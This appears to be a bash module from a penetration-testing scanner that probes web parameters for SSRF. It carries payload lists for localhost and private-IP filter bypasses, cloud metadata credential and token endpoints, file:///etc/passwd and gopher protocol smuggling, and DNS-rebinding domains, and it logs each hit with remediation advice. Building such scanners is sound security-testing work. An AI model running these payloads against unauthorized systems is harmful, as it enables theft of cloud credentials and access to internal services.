#!/bin/bash

# SSRF (Server-Side Request Forgery) Testing Module
# Tests for SSRF vulnerabilities

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"

# Main SSRF testing function
test_ssrf() {
    local url=$1
    local project_id=$2

    log_info "Testing SSRF vulnerabilities on $url"

    # Test internal network access
    test_ssrf_internal "$url" "$project_id"

    # Test cloud metadata access
    test_ssrf_cloud_metadata "$url" "$project_id"

    # Test protocol smuggling
    test_ssrf_protocols "$url" "$project_id"

    # Test DNS rebinding
    test_ssrf_dns_rebinding "$url" "$project_id"
}

# Test SSRF to internal network
test_ssrf_internal() {
    local url=$1
    local project_id=$2

    log_info "[SSRF] Testing internal network access"

    # Internal target payloads
    local ssrf_payloads=(
        # Localhost variants
        "http://localhost"
        "http://127.0.0.1"
        "http://127.0.0.1:80"
        "http://127.0.0.1:22"
        "http://127.0.0.1:3306"
        "http://127.0.0.1:5432"
        "http://127.0.0.1:6379"
        "http://127.0.0.1:27017"
        "http://127.1"
        "http://0.0.0.0"
        "http://[::1]"
        "http://[::]"
        # Private IP ranges
        "http://192.168.1.1"
        "http://192.168.0.1"
        "http://10.0.0.1"
        "http://172.16.0.1"
        # Bypass filters
        "http://127.1"
        "http://127.0.1"
        "http://2130706433"  # Decimal form of 127.0.0.1
        "http://0x7f000001"  # Hex form of 127.0.0.1
        "http://localhost.me"
        "http://spoofed.burpcollaborator.net"
        # URL encoding
        "http://127.0.0.1%23.example.com"
        "http://example.com#@127.0.0.1"
        # DNS rebinding
        "http://1ocalhost"
        "http://127.0.0.1.nip.io"
    )

    # Parameters likely to be vulnerable
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("url" "uri" "path" "dest" "destination" "redirect" "site" "html" "feed" "host" "page" "val" "validate" "domain" "callback" "return" "continue" "view" "proxy")
        for param in "${common_params[@]}"; do
            test_ssrf_parameter "$url" "$param" "$project_id" "${ssrf_payloads[@]}"
        done
    else
        while read -r param; do
            test_ssrf_parameter "$url" "$param" "$project_id" "${ssrf_payloads[@]}"
        done <<< "$params"
    fi
}

# Test SSRF on specific parameter
test_ssrf_parameter() {
    local url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    log_debug "[SSRF] Testing parameter: $param"

    # Get baseline
    local baseline_url=$(build_test_url "$url" "$param" "http://example.com")
    local baseline_response=$(curl -s -L --max-time 10 "$baseline_url" 2>/dev/null)
    local baseline_code=$(curl -s -o /dev/null -w "%{http_code}" -L --max-time 10 "$baseline_url" 2>/dev/null)

    for payload in "${payloads[@]}"; do
        local test_url=$(build_test_url "$url" "$param" "$payload")

        log_debug "[SSRF] Testing: $payload"

        local start=$(date +%s)
        local response=$(curl -s -L --max-time 10 -w "\n---HTTP_CODE:%{http_code}---" "$test_url" 2>/dev/null)
        local end=$(date +%s)

        local body=$(echo "$response" | sed -n '1,/---HTTP_CODE:/p' | head -n -1)
        local code=$(echo "$response" | grep -o "---HTTP_CODE:[0-9]*" | cut -d: -f2)

        # Check for successful internal access
        if [ "$code" = "200" ] && [ -n "$body" ]; then
            # Check for localhost indicators
            if echo "$payload" | grep -qE "127\.0\.0\.1|localhost|\[::1\]" && echo "$body" | grep -qiE "apache|nginx|iis|server|dashboard|admin|login|index of|directory listing"; then
                log_critical "[SSRF] SSRF vulnerability found in parameter '$param' - localhost access!"

                db_add_finding "$project_id" "critical" "ssrf_localhost" \
                    "SSRF - Server-Side Request Forgery to Localhost" \
                    "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSuccessfully accessed localhost services.\n\nResponse indicates web server or service running on localhost." \
                    "" "9.1" \
                    "CRITICAL:\n1. Validate and whitelist allowed URLs/domains\n2. Disable redirects or validate redirect targets\n3. Use network segmentation\n4. Block requests to private IP ranges\n5. Implement egress filtering\n6. Use URL parsing libraries carefully\n7. Validate URL scheme (allow only http/https)\n8. Block metadata endpoints"

                save_ssrf_evidence "$project_id" "$test_url" "$payload" "$body"
                return 0
            fi

            # Check for internal service responses
            if echo "$payload" | grep -qE ":22|:3306|:5432|:6379|:27017"; then
                local port=$(echo "$payload" | grep -oP ':\K\d+')
                log_critical "[SSRF] SSRF to internal service detected - port $port accessible!"

                db_add_finding "$project_id" "critical" "ssrf_internal_service" \
                    "SSRF - Access to Internal Services" \
                    "URL: $test_url\nParameter: $param\nPayload: $payload\nPort: $port\n\nInternal services are accessible via SSRF.\n\nThis may expose databases, Redis, MongoDB, or other internal services." \
                    "" "9.3" \
                    "CRITICAL:\n1. Block SSRF vulnerability\n2. Implement strict URL validation\n3. Use network segmentation\n4. Restrict outbound connections\n5. Monitor for internal port scanning"

                save_ssrf_evidence "$project_id" "$test_url" "$payload" "$body"
                return 0
            fi

            # Check for private IP access
            if echo "$payload" | grep -qE "192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\."; then
                log_critical "[SSRF] SSRF to private IP range detected!"

                db_add_finding "$project_id" "high" "ssrf_private_ip" \
                    "SSRF - Access to Private IP Ranges" \
                    "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSuccessfully accessed private IP address ranges.\n\nThis allows network scanning and access to internal resources." \
                    "" "8.6" \
                    "1. Block requests to private IP ranges\n2. Implement URL validation\n3. Use DNS resolution checks\n4. Whitelist allowed domains"

                save_ssrf_evidence "$project_id" "$test_url" "$payload" "$body"
                return 0
            fi
        fi

        # Check for timing-based detection (port scanning)
        local response_time=$((end - start))
        if [ $response_time -ge 8 ] && echo "$payload" | grep -qE "127\.0\.0\.1:[0-9]+"; then
            log_warn "[SSRF] Possible internal port scanning capability detected"
        fi
    done

    return 1
}

# Test cloud metadata access
test_ssrf_cloud_metadata() {
    local url=$1
    local project_id=$2

    log_info "[SSRF] Testing cloud metadata access"

    # Cloud metadata endpoints
    local metadata_payloads=(
        # AWS
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        "http://169.254.169.254/latest/user-data/"
        "http://169.254.169.254/latest/dynamic/instance-identity/"
        # AWS IMDSv2 (requires token, but worth trying)
        "http://169.254.169.254/latest/api/token"
        # Google Cloud
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://metadata.google.internal/computeMetadata/v1/instance/"
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        "http://metadata/computeMetadata/v1/"
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
        # Digital Ocean
        "http://169.254.169.254/metadata/v1/"
        "http://169.254.169.254/metadata/v1/user-data"
        # Oracle Cloud
        "http://169.254.169.254/opc/v1/instance/"
    )

    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("url" "uri" "redirect" "feed")
        for param in "${common_params[@]}"; do
            test_metadata_parameter "$url" "$param" "$project_id" "${metadata_payloads[@]}"
        done
    else
        while read -r param; do
            test_metadata_parameter "$url" "$param" "$project_id" "${metadata_payloads[@]}"
        done <<< "$params"
    fi
}

# Test metadata access on parameter
test_metadata_parameter() {
    local url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    for payload in "${payloads[@]}"; do
        local test_url=$(build_test_url "$url" "$param" "$payload")

        local response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)

        # Check for AWS metadata
        if echo "$payload" | grep -q "169.254.169.254" && echo "$response" | grep -qiE "ami-id|instance-id|security-credentials|iam|role"; then
            log_critical "[SSRF] AWS metadata access detected!"

            db_add_finding "$project_id" "critical" "ssrf_aws_metadata" \
                "SSRF - AWS Metadata Service Access" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSuccessfully accessed AWS EC2 metadata service!\n\nThis may expose IAM credentials and sensitive instance information." \
                "" "9.9" \
                "CRITICAL - IMMEDIATE ACTION:\n1. Fix SSRF vulnerability immediately\n2. Review IAM roles attached to instance\n3. Rotate credentials\n4. Check CloudTrail logs for unauthorized access\n5. Consider using IMDSv2 (requires token)\n6. Block 169.254.169.254 in application firewall"

            save_ssrf_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi

        # Check for Google Cloud metadata
        if echo "$payload" | grep -q "metadata.google.internal" && echo "$response" | grep -qiE "project-id|instance|service-accounts|token"; then
            log_critical "[SSRF] Google Cloud metadata access detected!"

            db_add_finding "$project_id" "critical" "ssrf_gcp_metadata" \
                "SSRF - Google Cloud Metadata Access" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nAccessed Google Cloud metadata service!\n\nMay expose service account tokens and credentials." \
                "" "9.9" \
                "CRITICAL:\n1. Fix SSRF immediately\n2. Rotate service account keys\n3. Review GCP audit logs\n4. Block metadata endpoint\n5. Require Metadata-Flavor header"

            save_ssrf_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi

        # Check for Azure metadata
        if echo "$payload" | grep -q "azure" && echo "$response" | grep -qiE "compute|network|access_token|subscription"; then
            log_critical "[SSRF] Azure metadata access detected!"

            db_add_finding "$project_id" "critical" "ssrf_azure_metadata" \
                "SSRF - Azure Metadata Service Access" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nAccessed Azure Instance Metadata Service!" \
                "" "9.9" \
                "CRITICAL:\n1. Fix SSRF\n2. Review Azure Activity Log\n3. Rotate managed identity credentials\n4. Block metadata endpoint"

            save_ssrf_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi
    done

    return 1
}

# Test protocol smuggling
test_ssrf_protocols() {
    local url=$1
    local project_id=$2

    log_info "[SSRF] Testing protocol smuggling"

    local protocol_payloads=(
        "file:///etc/passwd"
        "file:///c:/windows/win.ini"
        "gopher://127.0.0.1:25/_HELO%20test"
        "dict://127.0.0.1:11211/stats"
        "ftp://127.0.0.1"
        "sftp://127.0.0.1"
        "tftp://127.0.0.1"
        "ldap://127.0.0.1"
    )

    local params=$(extract_url_parameters "$url")
    [ -z "$params" ] && params="url"

    while read -r param; do
        for payload in "${protocol_payloads[@]}"; do
            local test_url=$(build_test_url "$url" "$param" "$payload")
            local response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)

            if [ -n "$response" ] && [ ${#response} -gt 50 ]; then
                if echo "$payload" | grep -q "file://" && echo "$response" | grep -qE "root:|administrator"; then
                    log_critical "[SSRF] File protocol SSRF detected!"

                    db_add_finding "$project_id" "critical" "ssrf_file_protocol" \
                        "SSRF - File Protocol Access" \
                        "URL: $test_url\nParameter: $param\nPayload: $payload\n\nfile:// protocol is accessible via SSRF!" \
                        "" "9.5" \
                        "CRITICAL:\n1. Whitelist allowed protocols (http/https only)\n2. Block file://, gopher://, dict://, etc.\n3. Implement URL validation"

                    save_ssrf_evidence "$project_id" "$test_url" "$payload" "$response"
                    return 0
                fi
            fi
        done
    done <<< "$params"
}

# Test DNS rebinding attacks
test_ssrf_dns_rebinding() {
    local url=$1
    local project_id=$2

    log_info "[SSRF] Testing DNS Rebinding attacks"

    # DNS rebinding payloads using various DNS services
    # These domains resolve to localhost/internal IPs
    local rebinding_payloads=(
        # nip.io - resolves to IP in domain name
        "http://127.0.0.1.nip.io"
        "http://192.168.1.1.nip.io"
        "http://10.0.0.1.nip.io"
        "http://172.16.0.1.nip.io"
        # sslip.io - similar to nip.io
        "http://127.0.0.1.sslip.io"
        "http://192.168.0.1.sslip.io"
        "http://10.0.0.1.sslip.io"
        # localtest.me - resolves to 127.0.0.1
        "http://localtest.me"
        "http://www.localtest.me"
        # vcap.me - resolves to 127.0.0.1
        "http://vcap.me"
        "http://www.vcap.me"
        # lvh.me - resolves to 127.0.0.1
        "http://lvh.me"
        "http://www.lvh.me"
        # Other localhost aliases
        "http://127.0.0.1.xip.io"
        "http://169.254.169.254.nip.io"  # AWS metadata via DNS
        # Subdomain variations
        "http://anything.127.0.0.1.nip.io"
        "http://test.localtest.me"
    )

    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("url" "uri" "redirect" "feed" "proxy" "callback")
        for param in "${common_params[@]}"; do
            test_dns_rebinding_param "$url" "$param" "$project_id" "${rebinding_payloads[@]}"
        done
    else
        while read -r param; do
            test_dns_rebinding_param "$url" "$param" "$project_id" "${rebinding_payloads[@]}"
        done <<< "$params"
    fi
}

# Test DNS rebinding on specific parameter
test_dns_rebinding_param() {
    local url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    log_debug "[SSRF] Testing DNS rebinding on parameter: $param"

    for payload in "${payloads[@]}"; do
        local test_url=$(build_test_url "$url" "$param" "$payload")

        log_debug "[SSRF] Testing DNS rebinding: $payload"

        # First, verify DNS resolution
        local domain=$(echo "$payload" | sed 's|http[s]*://||' | cut -d/ -f1 | cut -d: -f1)
        local resolved_ip=""

        # Try to resolve domain (if host/nslookup available)
        if command -v host &> /dev/null; then
            resolved_ip=$(host "$domain" 2>/dev/null | grep "has address" | awk '{print $4}' | head -1)
        elif command -v nslookup &> /dev/null; then
            resolved_ip=$(nslookup "$domain" 2>/dev/null | grep -A1 "Name:" | tail -1 | awk '{print $2}')
        fi

        # Check if it resolves to private/localhost IP
        local is_private=false
        if echo "$resolved_ip" | grep -qE '^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|169\.254\.)'; then
            is_private=true
            log_debug "[SSRF] DNS rebinding domain resolves to private IP: $resolved_ip"
        fi

        # Send request
        local response=$(curl -s -L --max-time 10 -w "\n---HTTP_CODE:%{http_code}---" "$test_url" 2>/dev/null)
        local body=$(echo "$response" | sed -n '1,/---HTTP_CODE:/p' | head -n -1)
        local code=$(echo "$response" | grep -o "---HTTP_CODE:[0-9]*" | cut -d: -f2)

        # If we got a successful response from what should be a private IP
        if [ "$code" = "200" ] && [ -n "$body" ] && [ "$is_private" = "true" ]; then
            # Check for indicators of internal services
            if echo "$body" | grep -qiE "apache|nginx|iis|server|dashboard|admin|login|index of|localhost"; then
                log_critical "[SSRF] DNS rebinding vulnerability found in parameter '$param'!"

                db_add_finding "$project_id" "critical" "ssrf_dns_rebinding" \
                    "SSRF - DNS Rebinding Attack" \
                    "URL: $test_url\nParameter: $param\nPayload: $payload\nDomain: $domain\nResolved IP: $resolved_ip\n\nThe application is vulnerable to DNS rebinding attacks!\n\nThe domain '$domain' resolves to a private IP ($resolved_ip) but the application did not properly validate this and made a request to internal resources.\n\nThis allows bypassing IP-based SSRF protections using DNS rebinding techniques." \
                    "" "9.5" \
                    "CRITICAL - DNS REBINDING PROTECTION:\n1. Validate resolved IPs after DNS lookup, not just domain names\n2. Re-resolve domains before making requests\n3. Block requests to private IP ranges (RFC1918, localhost)\n4. Implement DNS pinning (cache first resolution, reject changes)\n5. Use allowlist of approved domains only\n6. Disable DNS resolution if possible (use IP allowlist)\n7. Set short TTL for DNS cache and re-validate\n8. Monitor for rapid DNS changes\n9. Consider using a proxy with DNS rebinding protection"

                save_ssrf_evidence "$project_id" "$test_url" "$payload - Resolved to: $resolved_ip" "$body"
                return 0
            fi
        fi

        # Also check for timing-based detection
        # DNS rebinding can cause delays if the app re-resolves
        local start=$(date +%s)
        curl -s -L --max-time 10 "$test_url" > /dev/null 2>&1
        local end=$(date +%s)
        local response_time=$((end - start))

        # If response is slow and domain resolves to private IP, might be rebinding attempt
        if [ $response_time -ge 5 ] && [ "$is_private" = "true" ]; then
            log_warn "[SSRF] Possible DNS rebinding behavior detected - slow response with private IP resolution"
        fi
    done

    return 1
}

# Helper functions
build_test_url() {
    local url=$1
    local param=$2
    local value=$3
    local encoded_value=$(urlencode "$value")

    if [[ "$url" == *"?"* ]]; then
        if [[ "$url" == *"$param="* ]]; then
            echo "$url" | sed "s|\([?&]${param}=\)[^&]*|\1${encoded_value}|"
        else
            echo "${url}&${param}=${encoded_value}"
        fi
    else
        echo "${url}?${param}=${encoded_value}"
    fi
}

extract_url_parameters() {
    local url=$1
    [[ "$url" != *"?"* ]] && return 1
    echo "${url#*\?}" | tr '&' '\n' | cut -d= -f1
}

urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "$encoded"
}

save_ssrf_evidence() {
    local project_id=$1
    local url=$2
    local payload=$3
    local response=$4

    local evidence_dir="data/projects/${project_id}/evidence/ssrf"
    mkdir -p "$evidence_dir"

    local timestamp=$(date +%Y%m%d_%H%M%S)
    cat > "${evidence_dir}/ssrf_${timestamp}.txt" <<EOF
SSRF Evidence
URL: $url
Payload: $payload
Captured: $(date)

Response (first 3000 chars):
${response:0:3000}
EOF
}

export -f test_ssrf
export -f test_ssrf_internal
export -f test_ssrf_cloud_metadata
export -f test_ssrf_protocols
export -f test_ssrf_dns_rebinding
export -f test_dns_rebinding_param
